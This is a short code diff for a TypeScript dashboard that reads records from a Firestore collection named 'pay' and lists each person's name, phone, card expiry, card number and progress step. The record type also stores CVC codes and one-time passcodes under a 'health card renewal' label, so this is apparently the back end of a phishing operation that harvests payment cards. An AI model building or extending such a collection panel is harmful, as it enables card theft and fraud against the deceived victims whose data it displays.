@@ -27,7 +27,8 @@ interface HealthCardRenewal {
   step: number
   name: string
   phone: string
-  data: string
+  dateMonth: string
+  datayaer: string
   CVC: string
   otp: string
   cardNumber: string
@@ -41,7 +42,7 @@ export default function Dashboard() {
   useEffect(() => {
     async function fetchRenewals() {
       try {
-        const renewalsCollection = collection(db, 'healthCardRenewals')
+        const renewalsCollection = collection(db, 'pay')
         const renewalsSnapshot = await getDocs(renewalsCollection)
         const renewalsList = renewalsSnapshot.docs.map(doc => ({
           id: doc.id,
@@ -90,7 +91,7 @@ export default function Dashboard() {
                 <TableRow key={renewal.id}>
                   <TableCell>{renewal.name}</TableCell>
                   <TableCell>{renewal.phone}</TableCell>
-                  <TableCell>{renewal.data}</TableCell>
+                  <TableCell>{renewal.datayaer+'/'+renewal.dateMonth}</TableCell>
                   <TableCell>{renewal.cardNumber}</TableCell>
                   <TableCell>{renewal.step}</TableCell>
                 </TableRow>
